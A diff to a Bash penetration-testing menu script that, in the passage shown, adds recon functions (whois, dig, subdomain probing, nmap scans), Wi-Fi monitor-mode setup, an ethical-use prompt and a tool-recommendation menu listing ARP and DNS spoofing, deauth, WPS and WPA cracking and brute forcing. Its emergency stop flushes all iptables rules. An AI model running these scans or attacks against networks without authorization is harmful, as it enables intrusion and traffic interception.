@@ -2,55 +2,170 @@
 
 # Advanced Network Security Testing Suite
 # For authorized testing on networks you own or have permission to test
+# Version: 2.0
 
 # Enable strict error handling
 set -euo pipefail
 
 # Colors for output
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
-PURPLE='\033[0;35m'
-CYAN='\033[0;36m'
-NC='\033[0m' # No Color
+readonly RED='\033[0;31m'
+readonly GREEN='\033[0;32m'
+readonly YELLOW='\033[1;33m'
+readonly BLUE='\033[0;34m'
+readonly PURPLE='\033[0;35m'
+readonly CYAN='\033[0;36m'
+readonly WHITE='\033[1;37m'
+readonly NC='\033[0m' # No Color
 
 # Global variables
 SESSION_DIR=""
 CURRENT_TARGET=""
 CURRENT_INTERFACE=""
-CONFIG_FILE="$HOME/.network_tester.conf"
+MONITOR_INTERFACE=""
+ORIGINAL_INTERFACE=""
+readonly CONFIG_FILE="$HOME/.network_tester.conf"
+readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
-# Error handling functions :cite[2]:cite[9]
+# Array to track background processes
+declare -a BACKGROUND_PIDS=()
+
+# Error handling functions
 yell() { echo -e "${RED}$0: $*${NC}" >&2; }
 die() { yell "$*"; emergency_stop; exit 111; }
 try() { "$@" || die "Cannot $*"; }
 
-# Function to display header
-header() {
-    clear
-    echo -e "${BLUE}==================================================${NC}"
-    echo -e "${BLUE}        Advanced Network Security Testing Suite   ${NC}"
-    echo -e "${BLUE}==================================================${NC}"
-    if [ -n "$SESSION_DIR" ]; then
-        echo -e "${YELLOW}Session: $(basename $SESSION_DIR)${NC}"
+# Function to get local network information
+get_network_info() {
+    local default_interface
+    local local_ip
+    local public_ip
+    local subnet
+    local gateway
+    local dns_servers
+    local hostname
+    local mac_address
+    
+    # Get default interface
+    default_interface=$(ip route | grep default | awk '{print $5}' | head -1)
+    
+    # Get local IP
+    if [ -n "$default_interface" ]; then
+        local_ip=$(ip addr show "$default_interface" 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1 | head -1)
+        subnet=$(ip addr show "$default_interface" 2>/dev/null | grep "inet " | awk '{print $2}' | head -1)
+        mac_address=$(ip link show "$default_interface" 2>/dev/null | grep "link/ether" | awk '{print $2}')
+    else
+        local_ip="N/A"
+        subnet="N/A"
+        mac_address="N/A"
     fi
-    if [ -n "$CURRENT_TARGET" ]; then
-        echo -e "${YELLOW}Target: $CURRENT_TARGET${NC}"
-    fi
-    echo -e "${YELLOW}Use only on networks you have permission to test${NC}"
-    echo -e "${YELLOW}Unauthorized access to computer systems is illegal${NC}"
+    
+    # Get public IP (with timeout)
+    public_ip=$(timeout 3 curl -s ifconfig.me 2>/dev/null || timeout 3 curl -s icanhazip.com 2>/dev/null || echo "N/A")
+    
+    # Get gateway
+    gateway=$(ip route | grep default | awk '{print $3}' | head -1)
+    
+    # Get DNS servers
+    dns_servers=$(grep "nameserver" /etc/resolv.conf 2>/dev/null | awk '{print $2}' | head -3 | tr '\n' ', ' | sed 's/,$//')
+    
+    # Get hostname
+    hostname=$(hostname 2>/dev/null || echo "N/A")
+    
+    # Display information
+    echo -e "${CYAN}╔═══════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${CYAN}║${NC}                    ${GREEN}NETWORK INFORMATION${NC}                      ${CYAN}║${NC}"
+    echo -e "${CYAN}╠═══════════════════════════════════════════════════════════════╣${NC}"
+    echo -e "${CYAN}║${NC} ${YELLOW}Computer Name:${NC}    ${WHITE}$(printf '%-43s' "$hostname")${NC}${CYAN}║${NC}"
+    echo -e "${CYAN}║${NC} ${YELLOW}Interface:${NC}        ${WHITE}$(printf '%-43s' "${default_interface:-N/A}")${NC}${CYAN}║${NC}"
+    echo -e "${CYAN}║${NC} ${YELLOW}Local IP:${NC}         ${WHITE}$(printf '%-43s' "${local_ip:-N/A}")${NC}${CYAN}║${NC}"
+    echo -e "${CYAN}║${NC} ${YELLOW}Public IP:${NC}        ${WHITE}$(printf '%-43s' "${public_ip:-N/A}")${NC}${CYAN}║${NC}"
+    echo -e "${CYAN}║${NC} ${YELLOW}Subnet:${NC}           ${WHITE}$(printf '%-43s' "${subnet:-N/A}")${NC}${CYAN}║${NC}"
+    echo -e "${CYAN}║${NC} ${YELLOW}Gateway:${NC}          ${WHITE}$(printf '%-43s' "${gateway:-N/A}")${NC}${CYAN}║${NC}"
+    echo -e "${CYAN}║${NC} ${YELLOW}MAC Address:${NC}      ${WHITE}$(printf '%-43s' "${mac_address:-N/A}")${NC}${CYAN}║${NC}"
+    echo -e "${CYAN}║${NC} ${YELLOW}DNS Servers:${NC}      ${WHITE}$(printf '%-43s' "${dns_servers:-N/A}")${NC}${CYAN}║${NC}"
+    echo -e "${CYAN}╚═══════════════════════════════════════════════════════════════╝${NC}"
     echo ""
 }
 
-# Function to check if tool is installed :cite[8]
+# Function to display cool banner
+display_banner() {
+    clear
+    echo -e "${RED}"
+    cat << "EOF"
+    ███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗
+    ████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝
+    ██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ 
+    ██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██╔═██╗ 
+    ██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗
+    ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
+EOF
+    echo -e "${NC}"
+    echo -e "${BLUE}          ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗${NC}"
+    echo -e "${BLUE}          ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝${NC}"
+    echo -e "${BLUE}          ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ ${NC}"
+    echo -e "${BLUE}          ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  ${NC}"
+    echo -e "${BLUE}          ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   ${NC}"
+    echo -e "${BLUE}          ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   ${NC}"
+    echo ""
+    echo -e "${CYAN}                    ████████╗███████╗███████╗████████╗███████╗██████╗ ${NC}"
+    echo -e "${CYAN}                    ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗${NC}"
+    echo -e "${CYAN}                       ██║   █████╗  ███████╗   ██║   █████╗  ██████╔╝${NC}"
+    echo -e "${CYAN}                       ██║   ██╔══╝  ╚════██║   ██║   ██╔══╝  ██╔══██╗${NC}"
+    echo -e "${CYAN}                       ██║   ███████╗███████║   ██║   ███████╗██║  ██║${NC}"
+    echo -e "${CYAN}                       ╚═╝   ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝${NC}"
+    echo ""
+    echo -e "${PURPLE}                           Advanced Penetration Testing Suite${NC}"
+    echo -e "${YELLOW}                                    Version 2.0${NC}"
+    echo ""
+    echo -e "${RED}        ⚠️  WARNING: For Authorized Security Testing Only! ⚠️${NC}"
+    echo -e "${RED}           Unauthorized access to computer systems is illegal${NC}"
+    echo ""
+    
+    # Display network information
+    get_network_info
+}
+
+# Function to display header (simplified for menu screens)
+header() {
+    clear
+    echo -e "${BLUE}╔════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${BLUE}║${NC}        ${RED}Advanced Network Security Testing Suite${NC}            ${BLUE}║${NC}"
+    echo -e "${BLUE}╚════════════════════════════════════════════════════════════════╝${NC}"
+    if [ -n "${SESSION_DIR:-}" ]; then
+        echo -e "${YELLOW}📁 Session: $(basename "$SESSION_DIR")${NC}"
+    fi
+    if [ -n "${CURRENT_TARGET:-}" ]; then
+        echo -e "${YELLOW}🎯 Target: $CURRENT_TARGET${NC}"
+    fi
+    echo ""
+}
+
+# Function to check if tool is installed
 check_tool() {
-    if ! command -v $1 &> /dev/null; then
-        echo -e "${RED}$1 is not installed.${NC}"
+    local tool_cmd="${1:-}"
+    local tool_package="${2:-$1}"
+    
+    if [ -z "$tool_cmd" ]; then
+        echo -e "${RED}Error: No tool specified${NC}"
+        return 1
+    fi
+    
+    if ! command -v "$tool_cmd" &> /dev/null; then
+        echo -e "${RED}$tool_cmd is not installed.${NC}"
+        echo "Package name: $tool_package"
         echo "Would you like to install it? (y/n)"
         read -r install_choice
         if [[ $install_choice == "y" || $install_choice == "Y" ]]; then
-            sudo apt-get install $2 -y
+            if command -v apt-get &> /dev/null; then
+                sudo apt-get update && sudo apt-get install "$tool_package" -y
+            elif command -v yum &> /dev/null; then
+                sudo yum install "$tool_package" -y
+            elif command -v pacman &> /dev/null; then
+                sudo pacman -S "$tool_package"
+            else
+                echo -e "${RED}Unable to detect package manager. Please install $tool_package manually.${NC}"
+                return 1
+            fi
         else
             return 1
         fi
@@ -60,12 +175,13 @@ check_tool() {
 
 # Session management
 setup_session() {
-    local timestamp=$(date +%Y%m%d_%H%M%S)
-    SESSION_DIR="sessions/session_$timestamp"
-    mkdir -p $SESSION_DIR
-    mkdir -p $SESSION_DIR/{logs,scans,captures,reports,evidence}
+    local timestamp
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    SESSION_DIR="$SCRIPT_DIR/sessions/session_$timestamp"
     
-    echo "Session started: $timestamp" >> $SESSION_DIR/session.log
+    mkdir -p "$SESSION_DIR"/{logs,scans,captures,reports,evidence}
+    
+    echo "Session started: $timestamp" >> "$SESSION_DIR/session.log"
     echo -e "${GREEN}New session created: $SESSION_DIR${NC}"
     
     # Collect initial system state
@@ -74,47 +190,83 @@ setup_session() {
 
 # Logging functions
 log_command() {
-    local command="$1"
-    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
-    echo "[$timestamp] $command" >> $SESSION_DIR/logs/command_history.log
+    local command="${1:-}"
+    local timestamp
+    timestamp=$(date +"%Y-%m-%d %H:%M:%S")
+    
+    if [ -n "${SESSION_DIR:-}" ]; then
+        echo "[$timestamp] $command" >> "$SESSION_DIR/logs/command_history.log"
+    fi
 }
 
 log_event() {
-    local event="$1"
-    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
-    echo "[$timestamp] $event" >> $SESSION_DIR/logs/events.log
+    local event="${1:-}"
+    local timestamp
+    timestamp=$(date +"%Y-%m-%d %H:%M:%S")
+    
+    if [ -n "${SESSION_DIR:-}" ]; then
+        echo "[$timestamp] $event" >> "$SESSION_DIR/logs/events.log"
+    fi
 }
 
 # Evidence collection
 collect_evidence() {
     echo -e "${YELLOW}Collecting system evidence...${NC}"
-    ifconfig > $SESSION_DIR/evidence/network_config.txt 2>/dev/null
-    ip addr > $SESSION_DIR/evidence/ip_config.txt 2>/dev/null
-    netstat -tulnp > $SESSION_DIR/evidence/active_connections.txt 2>/dev/null
-    ps aux > $SESSION_DIR/evidence/running_processes.txt 2>/dev/null
-    echo "Evidence collected at: $(date)" >> $SESSION_DIR/session.log
+    
+    if [ -n "${SESSION_DIR:-}" ]; then
+        {
+            ifconfig 2>/dev/null || ip addr 2>/dev/null
+        } > "$SESSION_DIR/evidence/network_config.txt"
+        
+        ip addr 2>/dev/null > "$SESSION_DIR/evidence/ip_config.txt" || true
+        netstat -tulnp 2>/dev/null > "$SESSION_DIR/evidence/active_connections.txt" || ss -tulnp > "$SESSION_DIR/evidence/active_connections.txt" 2>/dev/null || true
+        ps aux > "$SESSION_DIR/evidence/running_processes.txt" 2>/dev/null || true
+        
+        echo "Evidence collected at: $(date)" >> "$SESSION_DIR/session.log"
+    fi
 }
 
-# Safety checks :cite[7]:cite[10]
+# Safety checks
 safety_checks() {
     # Check if running as root
     if [ "$EUID" -ne 0 ]; then
-        echo -e "${RED}Some features require root privileges.${NC}"
+        echo -e "${YELLOW}⚠️  Not running as root. Some features require root privileges.${NC}"
         echo -e "${YELLOW}Please run with sudo for full functionality.${NC}"
         echo -e "${YELLOW}Press any key to continue or Ctrl+C to exit...${NC}"
         read -n 1 -s
     fi
     
+    # Verify ethical use agreement
+    echo -e "${RED}═══════════════════════════════════════════════════${NC}"
+    echo -e "${RED}           ETHICAL USE AGREEMENT${NC}"
+    echo -e "${RED}═══════════════════════════════════════════════════${NC}"
+    echo -e "${YELLOW}By using this tool, you confirm that:${NC}"
+    echo -e "${YELLOW}1. You have explicit written authorization${NC}"
+    echo -e "${YELLOW}2. You will only test systems you own or have permission to test${NC}"
+    echo -e "${YELLOW}3. You understand that unauthorized access is illegal${NC}"
+    echo ""
+    echo -e "${GREEN}Do you agree to these terms? (yes/no)${NC}"
+    read -r agreement
+    
+    if [[ ! $agreement =~ ^[Yy][Ee][Ss]$ ]]; then
+        echo -e "${RED}Agreement not accepted. Exiting.${NC}"
+        exit 1
+    fi
+    
     # Check if targeting own network
-    if [ -n "$CURRENT_TARGET" ]; then
-        local target_network=$(echo $CURRENT_TARGET | cut -d. -f1-3)
-        local my_network=$(ip addr show 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d. -f1-3 | head -1)
+    if [ -n "${CURRENT_TARGET:-}" ]; then
+        local target_network
+        local my_network
+        target_network=$(echo "$CURRENT_TARGET" | cut -d. -f1-3)
+        my_network=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d. -f1-3 | head -1)
         
-        if [ "$target_network" = "$my_network" ]; then
-            echo -e "${RED}WARNING: You are targeting your own network!${NC}"
-            echo -e "${YELLOW}Are you sure you want to continue? (y/n)${NC}"
+        if [ "$target_network" != "$my_network" ]; then
+            echo -e "${RED}⚠️  WARNING: You are targeting a different network!${NC}"
+            echo -e "${YELLOW}Target network: $target_network.x${NC}"
+            echo -e "${YELLOW}Your network: $my_network.x${NC}"
+            echo -e "${YELLOW}Do you have authorization to test this network? (yes/no)${NC}"
             read -r confirm
-            if [ "$confirm" != "y" ]; then
+            if [[ ! $confirm =~ ^[Yy][Ee][Ss]$ ]]; then
                 return 1
             fi
         fi
@@ -123,100 +275,132 @@ safety_checks() {
     return 0
 }
 
-# Emergency stop function :cite[2]
+# Emergency stop function
 emergency_stop() {
-    echo -e "${RED}EMERGENCY STOP ACTIVATED${NC}"
+    echo -e "${RED}🛑 EMERGENCY STOP ACTIVATED${NC}"
     log_event "EMERGENCY STOP ACTIVATED"
     
+    # Kill tracked background processes
+    for pid in "${BACKGROUND_PIDS[@]:-}"; do
+        if ps -p "$pid" > /dev/null 2>&1; then
+            kill -9 "$pid" 2>/dev/null || true
+        fi
+    done
+    BACKGROUND_PIDS=()
+    
     # Kill all security tools
-    pkill -f nmap
-    pkill -f tcpdump
-    pkill -f tshark
-    pkill -f aireplay-ng
-    pkill -f mdk4
-    pkill -f bettercap
-    pkill -f ettercap
-    pkill -f sslstrip
-    pkill -f dnschef
+    pkill -f nmap 2>/dev/null || true
+    pkill -f tcpdump 2>/dev/null || true
+    pkill -f tshark 2>/dev/null || true
+    pkill -f aireplay-ng 2>/dev/null || true
+    pkill -f mdk4 2>/dev/null || true
+    pkill -f bettercap 2>/dev/null || true
+    pkill -f ettercap 2>/dev/null || true
+    pkill -f sslstrip 2>/dev/null || true
+    pkill -f dnschef 2>/dev/null || true
+    pkill -f arpspoof 2>/dev/null || true
     
     # Reset iptables
-    iptables -F 2>/dev/null
-    iptables -t nat -F 2>/dev/null
-    
-    # Disable monitor mode if active
-    if [ -n "$CURRENT_INTERFACE" ]; then
-        sudo airmon-ng stop "${CURRENT_INTERFACE}mon" 2>/dev/null
-        sudo service network-manager restart 2>/dev/null
+    if command -v iptables &> /dev/null && [ "$EUID" -eq 0 ]; then
+        iptables -F 2>/dev/null || true
+        iptables -t nat -F 2>/dev/null || true
     fi
     
-    echo -e "${GREEN}All processes stopped and network reset${NC}"
+    # Disable monitor mode if active
+    if [ -n "${MONITOR_INTERFACE:-}" ]; then
+        disable_monitor_mode
+    fi
+    
+    echo -e "${GREEN}✓ All processes stopped and network reset${NC}"
     log_event "All processes stopped and network reset"
 }
 
-# AI-like tool recommendation system :cite[3]:cite[8]
+# Disable monitor mode properly
+disable_monitor_mode() {
+    if [ -n "${ORIGINAL_INTERFACE:-}" ]; then
+        echo -e "${YELLOW}Disabling monitor mode on $MONITOR_INTERFACE...${NC}"
+        
+        if command -v airmon-ng &> /dev/null; then
+            sudo airmon-ng stop "$MONITOR_INTERFACE" 2>/dev/null || true
+        fi
+        
+        # Restart network manager
+        if command -v systemctl &> /dev/null; then
+            sudo systemctl restart NetworkManager 2>/dev/null || true
+        else
+            sudo service network-manager restart 2>/dev/null || true
+        fi
+        
+        MONITOR_INTERFACE=""
+        ORIGINAL_INTERFACE=""
+        log_event "Monitor mode disabled"
+    fi
+}
+
+# AI-like tool recommendation system
 recommend_tools() {
-    local scenario="$1"
+    local scenario="${1:-general}"
     
     case $scenario in
         "stealth_scan")
             echo -e "${CYAN}Recommended for stealth scanning:${NC}"
-            echo "  - nmap -sS -T2 (Stealth SYN scan)"
-            echo "  - masscan --rate=100 (Fast scan with rate limiting)"
-            echo "  - unicornscan (Advanced scanner)"
+            echo "  • nmap -sS -T2 (Stealth SYN scan, slow timing)"
+            echo "  • nmap -f (Fragment packets)"
+            echo "  • masscan --rate=100 (Fast scan with rate limiting)"
+            echo "  • unicornscan (Advanced asynchronous scanner)"
             ;;
         "comprehensive_scan")
             echo -e "${CYAN}Recommended for comprehensive scanning:${NC}"
-            echo "  - nmap -sS -sV -sC -O (Full TCP scan with version detection)"
-            echo "  - nessus (Vulnerability scanner)"
-            echo "  - openvas (Open source vulnerability scanner)"
+            echo "  • nmap -sS -sV -sC -O (Full TCP scan with scripts)"
+            echo "  • nmap --script vuln (Vulnerability detection scripts)"
+            echo "  • OpenVAS (Open source vulnerability scanner)"
             ;;
         "web_scan")
             echo -e "${CYAN}Recommended for web application scanning:${NC}"
-            echo "  - nikto (Web server scanner)"
-            echo "  - wapiti (Web application vulnerability scanner)"
-            echo "  - dirb (Web content scanner)"
-            echo "  - gobuster (Directory/file busting tool)"
-            echo "  - sqlmap (SQL injection tool)"
+            echo "  • nikto -h <url> (Web server scanner)"
+            echo "  • dirb <url> (Web content scanner)"
+            echo "  • gobuster dir -u <url> (Directory busting)"
+            echo "  • sqlmap -u <url> (SQL injection testing)"
             ;;
         "wireless_attack")
-            echo -e "${CYAN}Recommended for wireless attacks:${NC}"
-            echo "  - aireplay-ng (Wi-Fi attack tool)"
-            echo "  - mdk4 (Modern Wi-Fi attack tool)"
-            echo "  - reaver (WPS attack tool)"
-            echo "  - bully (WPS attack tool)"
+            echo -e "${CYAN}Recommended for wireless security testing:${NC}"
+            echo "  • airodump-ng (Monitor and capture packets)"
+            echo "  • aireplay-ng (Injection and deauth attacks)"
+            echo "  • reaver (WPS PIN recovery)"
+            echo "  • aircrack-ng (WEP/WPA cracking)"
             ;;
         "password_attack")
-            echo -e "${CYAN}Recommended for password attacks:${NC}"
-            echo "  - john (Password cracker)"
-            echo "  - hashcat (Advanced password recovery)"
-            echo "  - hydra (Network logon cracker)"
-            echo "  - medusa (Network service cracker)"
+            echo -e "${CYAN}Recommended for password testing:${NC}"
+            echo "  • john (Password hash cracking)"
+            echo "  • hashcat (GPU-accelerated cracking)"
+            echo "  • hydra (Network service brute force)"
+            echo "  • medusa (Parallel brute forcing)"
             ;;
         "network_sniffing")
-            echo -e "${CYAN}Recommended for network sniffing:${NC}"
-            echo "  - tcpdump (Command-line packet analyzer)"
-            echo "  - tshark (Terminal Wireshark)"
-            echo "  - wireshark (GUI packet analyzer)"
-            echo "  - bettercap (Swiss army knife for network attacks)"
+            echo -e "${CYAN}Recommended for network traffic analysis:${NC}"
+            echo "  • tcpdump (Command-line packet capture)"
+            echo "  • tshark (Terminal Wireshark with filters)"
+            echo "  • wireshark (GUI packet analyzer)"
+            echo "  • bettercap (Network attack framework)"
             ;;
         "mitm_attack")
-            echo -e "${CYAN}Recommended for MITM attacks:${NC}"
-            echo "  - arpspoof (ARP spoofing tool)"
-            echo "  - ettercap (Comprehensive MITM suite)"
-            echo "  - bettercap (Modern MITM framework)"
-            echo "  - sslstrip (SSL stripping tool)"
+            echo -e "${CYAN}Recommended for MITM testing:${NC}"
+            echo "  • arpspoof (ARP cache poisoning)"
+            echo "  • ettercap (Comprehensive MITM suite)"
+            echo "  • bettercap (Modern MITM framework)"
+            echo "  • mitmproxy (Interactive HTTPS proxy)"
             ;;
         "dns_spoofing")
-            echo -e "${CYAN}Recommended for DNS spoofing:${NC}"
-            echo "  - dnschef (DNS proxy for spoofing)"
-            echo "  - ettercap (DNS spoofing capabilities)"
-            echo "  - evilgrade (Advanced DNS spoofing framework)"
+            echo -e "${CYAN}Recommended for DNS testing:${NC}"
+            echo "  • dnschef (DNS proxy for spoofing)"
+            echo "  • ettercap (Includes DNS spoofing)"
+            echo "  • bettercap (DNS spoofing module)"
             ;;
         *)
-            echo -e "${CYAN}General purpose tools:${NC}"
-            echo "  - nmap (Network mapper)"
-            echo "  - tcpdump (Packet analyzer)"
-            echo "  - tshark (Packet analyzer)"
+            echo -e "${CYAN}General purpose security tools:${NC}"
+            echo "  • nmap (Network discovery and scanning)"
+            echo "  • tcpdump (Packet capture and analysis)"
+            echo "  • metasploit (Exploitation framework)"
             ;;
     esac
 }
@@ -224,147 +408,275 @@ recommend_tools() {
 # Automated reconnaissance
 automated_recon() {
     header
-    echo -e "${GREEN}Automated Reconnaissance${NC}"
+    echo -e "${GREEN}═══ Automated Reconnaissance ═══${NC}"
     
-    if [ -z "$CURRENT_TARGET" ]; then
+    if [ -z "${CURRENT_TARGET:-}" ]; then
         echo -e "${GREEN}Enter target IP or domain:${NC}"
         read -r CURRENT_TARGET
+    fi
+    
+    if [ -z "$CURRENT_TARGET" ]; then
+        echo -e "${RED}No target specified${NC}"
+        return 1
     fi
     
     echo -e "${YELLOW}Starting comprehensive reconnaissance on $CURRENT_TARGET...${NC}"
     log_event "Starting automated reconnaissance on $CURRENT_TARGET"
     
     # Create directory for recon data
-    local recon_dir="$SESSION_DIR/recon_$(date +%Y%m%d_%H%M%S)"
-    mkdir -p $recon_dir
+    local recon_dir
+    recon_dir="$SESSION_DIR/recon_$(date +%Y%m%d_%H%M%S)"
+    mkdir -p "$recon_dir"
     
     # WHOIS lookup
-    echo -e "${CYAN}Performing WHOIS lookup...${NC}"
-    whois $CURRENT_TARGET > $recon_dir/whois.txt 2>&1
-    log_command "whois $CURRENT_TARGET"
+    if command -v whois &> /dev/null; then
+        echo -e "${CYAN}[1/5] Performing WHOIS lookup...${NC}"
+        whois "$CURRENT_TARGET" > "$recon_dir/whois.txt" 2>&1 || echo "WHOIS failed" > "$recon_dir/whois.txt"
+        log_command "whois $CURRENT_TARGET"
+    fi
     
     # DNS enumeration
-    echo -e "${CYAN}Performing DNS enumeration...${NC}"
-    dig $CURRENT_TARGET ANY > $recon_dir/dns_any.txt 2>&1
-    dig $CURRENT_TARGET A > $recon_dir/dns_a.txt 2>&1
-    dig $CURRENT_TARGET MX > $recon_dir/dns_mx.txt 2>&1
-    dig $CURRENT_TARGET NS > $recon_dir/dns_ns.txt 2>&1
-    log_command "dig $CURRENT_TARGET ANY"
+    if command -v dig &> /dev/null; then
+        echo -e "${CYAN}[2/5] Performing DNS enumeration...${NC}"
+        dig "$CURRENT_TARGET" ANY > "$recon_dir/dns_any.txt" 2>&1 || true
+        dig "$CURRENT_TARGET" A > "$recon_dir/dns_a.txt" 2>&1 || true
+        dig "$CURRENT_TARGET" MX > "$recon_dir/dns_mx.txt" 2>&1 || true
+        dig "$CURRENT_TARGET" NS > "$recon_dir/dns_ns.txt" 2>&1 || true
+        dig "$CURRENT_TARGET" TXT > "$recon_dir/dns_txt.txt" 2>&1 || true
+        log_command "dig $CURRENT_TARGET (multiple queries)"
+    fi
     
-    # Try subdomain discovery if it's a domain
+    # Subdomain discovery
     if [[ $CURRENT_TARGET =~ [a-zA-Z] ]]; then
-        echo -e "${CYAN}Attempting subdomain discovery...${NC}"
-        check_tool "sublist3r" "sublist3r"
-        if [ $? -eq 0 ]; then
-            sublist3r -d $CURRENT_TARGET > $recon_dir/subdomains.txt 2>&1
-            log_command "sublist3r -d $CURRENT_TARGET"
-        else
-            echo "Sublist3r not available, trying manual method..."
-            for sub in www ftp mail admin; do
-                host $sub.$CURRENT_TARGET >> $recon_dir/subdomains_manual.txt 2>&1
-            done
-        fi
+        echo -e "${CYAN}[3/5] Attempting subdomain discovery...${NC}"
+        
+        # Try common subdomains
+        echo -e "${YELLOW}  Checking common subdomains...${NC}"
+        for sub in www ftp mail admin test dev api portal vpn remote; do
+            if host "$sub.$CURRENT_TARGET" >> "$recon_dir/subdomains_manual.txt" 2>&1; then
+                echo "  ✓ Found: $sub.$CURRENT_TARGET"
+            fi
+        done
+    fi
+    
+    # Port scan
+    if command -v nmap &> /dev/null; then
+        echo -e "${CYAN}[4/5] Performing quick port scan...${NC}"
+        nmap -F -T4 "$CURRENT_TARGET" > "$recon_dir/port_scan.txt" 2>&1 || true
+        log_command "nmap -F -T4 $CURRENT_TARGET"
     fi
     
     # Service detection
-    echo -e "${CYAN}Performing service detection...${NC}"
-    nmap -sV --version-intensity 5 $CURRENT_TARGET > $recon_dir/service_detection.txt 2>&1
-    log_command "nmap -sV --version-intensity 5 $CURRENT_TARGET"
+    if command -v nmap &> /dev/null; then
+        echo -e "${CYAN}[5/5] Performing service detection...${NC}"
+        nmap -sV --version-intensity 5 -F "$CURRENT_TARGET" > "$recon_dir/service_detection.txt" 2>&1 || true
+        log_command "nmap -sV --version-intensity 5 -F $CURRENT_TARGET"
+    fi
     
-    # Get recommendations based on findings
-    echo -e "${CYAN}Analysis complete. Recommendations:${NC}"
+    # Summary
+    echo ""
+    echo -e "${GREEN}✓ Reconnaissance complete!${NC}"
+    echo -e "${CYAN}Results saved to: $recon_dir${NC}"
+    
+    # Show quick summary
+    if [ -f "$recon_dir/port_scan.txt" ]; then
+        echo -e "\n${CYAN}Open ports found:${NC}"
+        grep -E "open|filtered" "$recon_dir/port_scan.txt" | head -10 || echo "  None found"
+    fi
+    
+    echo ""
     recommend_tools "comprehensive_scan"
-    
-    echo -e "${GREEN}Reconnaissance data saved to: $recon_dir${NC}"
     log_event "Reconnaissance completed on $CURRENT_TARGET"
     
+    echo ""
     echo -e "${GREEN}Press any key to continue...${NC}"
     read -n 1 -s
 }
 
 # Function to get target information
 get_target() {
-    echo -e "${GREEN}Enter target IP, hostname, or network range:${NC}"
+    echo -e "${GREEN}Enter target IP, hostname, or network range (CIDR):${NC}"
     read -r CURRENT_TARGET
-    echo -e "${GREEN}Enter port(s) (default: common ports):${NC}"
+    
+    if [ -z "$CURRENT_TARGET" ]; then
+        echo -e "${RED}No target specified${NC}"
+        return 1
+    fi
+    
+    echo -e "${GREEN}Enter port(s) or port range (default: common ports):${NC}"
+    echo -e "${YELLOW}Examples: 80, 80-443, 21,22,23,80${NC}"
     read -r ports
-    if [[ -z "$ports" ]]; then
+    
+    if [ -z "$ports" ]; then
         ports="21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080"
     fi
 }
 
 # Function to get network interface
 get_interface() {
+    echo -e "${GREEN}Available network interfaces:${NC}"
+    ip -brief link show 2>/dev/null || ifconfig -s
+    echo ""
     echo -e "${GREEN}Enter network interface (e.g., eth0, wlan0):${NC}"
     read -r CURRENT_INTERFACE
+    
+    if [ -z "$CURRENT_INTERFACE" ]; then
+        echo -e "${RED}No interface specified${NC}"
+        return 1
+    fi
+    
+    # Verify interface exists
+    if ! ip link show "$CURRENT_INTERFACE" &> /dev/null; then
+        echo -e "${RED}Interface $CURRENT_INTERFACE does not exist${NC}"
+        return 1
+    fi
 }
 
 # Function to get wireless interface in monitor mode
 get_monitor_interface() {
+    echo -e "${GREEN}Available wireless interfaces:${NC}"
+    iw dev 2>/dev/null | grep Interface | awk '{print $2}' || iwconfig 2>&1 | grep -v "no wireless" | awk '{print $1}'
+    echo ""
     echo -e "${GREEN}Enter wireless interface (e.g., wlan0):${NC}"
     read -r wifi_interface
     
+    if [ -z "$wifi_interface" ]; then
+        echo -e "${RED}No interface specified${NC}"
+        return 1
+    fi
+    
+    ORIGINAL_INTERFACE="$wifi_interface"
+    
     echo -e "${YELLOW}Putting interface in monitor mode...${NC}"
-    sudo airmon-ng check kill > /dev/null 2>&1
-    sudo airmon-ng start $wifi_interface > /dev/null 2>&1
-    CURRENT_INTERFACE="${wifi_interface}mon"
-    echo -e "${GREEN}Monitor interface: $CURRENT_INTERFACE${NC}"
-    log_event "Set monitor mode on $CURRENT_INTERFACE"
+    
+    # Kill interfering processes
+    if command -v airmon-ng &> /dev/null; then
+        sudo airmon-ng check kill > /dev/null 2>&1 || true
+        
+        # Start monitor mode
+        local output
+        output=$(sudo airmon-ng start "$wifi_interface" 2>&1)
+        
+        # Try to detect the monitor interface name
+        if echo "$output" | grep -q "monitor mode.*enabled"; then
+            # Try common patterns
+            if ip link show "${wifi_interface}mon" &> /dev/null; then
+                MONITOR_INTERFACE="${wifi_interface}mon"
+            elif ip link show "mon${wifi_interface}" &> /dev/null; then
+                MONITOR_INTERFACE="mon${wifi_interface}"
+            else
+                # Fallback to the original interface
+                MONITOR_INTERFACE="$wifi_interface"
+            fi
+        else
+            echo -e "${RED}Failed to enable monitor mode${NC}"
+            return 1
+        fi
+    else
+        echo -e "${RED}airmon-ng not found. Install aircrack-ng suite.${NC}"
